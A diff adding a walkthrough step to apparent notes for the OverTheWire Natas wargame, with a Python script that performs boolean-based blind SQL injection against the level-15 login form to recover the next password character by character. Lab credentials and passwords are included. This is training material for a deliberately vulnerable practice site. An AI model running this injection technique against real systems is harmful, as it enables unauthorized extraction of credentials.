@@ -184,13 +184,44 @@ level>>14-15 :  > open the url in the browser.
 
                           Password: SdqIqBsFcz3yotlNYErZSZwblkm0lrvx
 
-level>>15-16 :
+level>>15-16 :  > open the url in the browser.
+                > enter the username and pass.
+                > In a python file write this code and run it.
+                  
+                  import requests
 
+                  characters = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
 
-
-
-
-
+                  username = "natas15"
+                  password = "TTka17AWG41DERZtBCeYKV7kRXH1EZRB"
+                  
+                  url = "http://natas15.natas.labs.overthewire.org"
+                  session = requests.Session()
+                  
+                  current_password = list()
+                  
+                  while True:
+                      for character in characters:
+                          print("Trying with: " + "".join(current_password) + character)
+                  
+                          response = session.post(
+                              url,
+                              data={
+                                  "username": "natas16\" AND password LIKE BINARY \"" +
+                                              "".join(current_password) + character + "%\" -- "
+                              },
+                              auth=(username, password)
+                          )
+                  
+                          print(response.text)
+                  
+                          if "This user exists." in response.text:
+                              current_password.append(character)
+                              break
+                  
+                      if len(current_password) == 32:
+                          break
+                > get the password.
 
                             Password: hPkjKYviLQctEW33QmuXL6eDVfMW4sGo
 
